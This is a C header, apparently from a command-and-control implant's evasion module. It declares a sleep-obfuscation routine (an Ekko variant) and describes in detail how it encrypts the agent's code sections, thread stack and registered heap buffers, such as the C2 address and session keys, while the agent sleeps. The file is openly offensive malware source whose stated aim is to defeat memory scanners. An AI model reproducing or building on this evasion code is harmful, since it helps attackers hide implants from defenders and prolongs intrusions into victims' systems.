/*
 * client/evasion/sleep_obf.h  –  Sleep obfuscation (Ekko-variant)
 * ================================================================
 * Encrypts the agent's own .text, .data, and .rdata sections in-place while
 * the thread sleeps, and decrypts them on wake.  During the sleep interval
 * the agent image in memory is ChaCha20 keystream-XOR ciphertext — a memory
 * scanner finds no recognisable code or string patterns.
 *
 * Additionally, the thread's committed stack range is evacuated to an
 * encrypted staging allocation before sleep and restored on wake (Ekko/Foliage
 * stack-evacuation model).  A registry of up to SO_HEAP_SLOTS sensitive heap
 * pointers can be registered via sleep_obf_register_heap(); those regions are
 * also XOR'd in-place during the sleep window.
 *
 * Technique
 * ---------
 *   1. Derive a 32-byte ChaCha20 key (BCrypt-SHA256) and 12-byte nonce
 *      (BCryptGenRandom) — unique per sleep cycle.
 *   2. XOR-cipher .text/.data/.rdata via _so_xor_image().
 *   3. Evacuate committed thread stack:
 *        a. Query TEB StackBase/StackLimit via NtCurrentTeb().
 *        b. Allocate a same-sized staging buffer (PAGE_READWRITE).
 *        c. ChaCha20-XOR live stack → staging buffer.
 *        d. SecureZeroMemory the live stack range.
 *   4. XOR-cipher registered sensitive heap blocks in-place.
 *   5. SC_NtDelayExecution.
 *   6. Decrypt staging buffer → live stack; free staging buffer.
 *   7. Decrypt heap blocks.
 *   8. Decrypt image sections (second _so_xor_image pass).
 *   9. SecureZeroMemory key + nonce.
 *
 * Stack evacuation notes
 * ----------------------
 * The evacuation copies the full committed stack (StackBase − StackLimit),
 * encrypts it into a separate allocation, zeros the live range, then on wake
 * decrypts back.  The function's own local frame (key, nonce, stack pointers)
 * lives above StackBase and is therefore NOT in the evacuated range — it stays
 * live throughout.  Only the call chain below the sleep_obf_delay frame is
 * encrypted and zeroed.
 *
 * Heap registry
 * -------------
 * Call sleep_obf_register_heap(ptr, sz) once after allocating each sensitive
 * block (C2 IP buffer, TLS context, session key buffer, etc.).  The registry
 * holds up to SO_HEAP_SLOTS entries.  Unregister by calling
 * sleep_obf_unregister_heap(ptr).
 *
 * Protection model
 * ----------------
 *  • Image sections: ciphertext during sleep window.
 *  • Stack: encrypted + zeroed; staging allocation is PAGE_READWRITE, never RX.
 *  • Registered heap blocks: XOR'd in-place.
 *  • Key and nonce: wiped with SecureZeroMemory after both passes.
 *  • .slpobf section excluded from all XOR passes (contains the cipher engine).
 *
 * Activation
 * ----------
 *   -DSLEEP_OBF_ENABLE on the compiler command line (or in source).
 *   When not defined, sleep_obf_delay() falls through to jitter_sleep().
 */

#pragma once
#ifndef CLIENT_SLEEP_OBF_H
#define CLIENT_SLEEP_OBF_H

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <bcrypt.h>
#include "syscall.h"
#include "peb_walk.h"

#ifdef __cplusplus
extern "C" {
#endif

/* Forward — defined in sandbox.c */
void jitter_sleep(DWORD ms);

/* Maximum number of sensitive heap blocks tracked for in-sleep encryption */
#define SO_HEAP_SLOTS  8

/* ── sleep_obf_register_heap ─────────────────────────────────────────────── */
/*
 * Register a heap allocation for XOR encryption during sleep windows.
 * Call once after allocating a sensitive buffer (C2 IP, TLS context, etc.).
 * ptr == NULL or sz == 0 are silently ignored.
 * When the slot table is full, the registration is silently dropped (the block
 * simply stays plaintext during sleep — not ideal but not a crash).
 */
void sleep_obf_register_heap(void *ptr, SIZE_T sz);

/* ── sleep_obf_unregister_heap ───────────────────────────────────────────── */
/*
 * Remove a previously registered heap block from the encryption registry.
 * Must be called before the block is freed to avoid a dangling write during
 * the next sleep cycle.
 */
void sleep_obf_unregister_heap(void *ptr);

/* ── sleep_obf_delay ────────────────────────────────────────────────────── */
/*
 * Primary API.  Sleep for `ms` milliseconds with full in-memory obfuscation.
 *
 * When SLEEP_OBF_ENABLE is defined:
 *   1. Derives a fresh ChaCha20/20 key + nonce.
 *   2. XOR-ciphers image sections.
 *   3. Evacuates + encrypts the committed thread stack.
 *   4. XOR-ciphers registered heap blocks.
 *   5. SC_NtDelayExecution.
 *   6. Restores stack, heap, and image sections.
 *   7. Wipes key and nonce.
 *
 * When SLEEP_OBF_ENABLE is not defined: falls through to jitter_sleep().
 */
void sleep_obf_delay(DWORD ms);

#ifdef __cplusplus
}
#endif
#endif /* CLIENT_SLEEP_OBF_H */
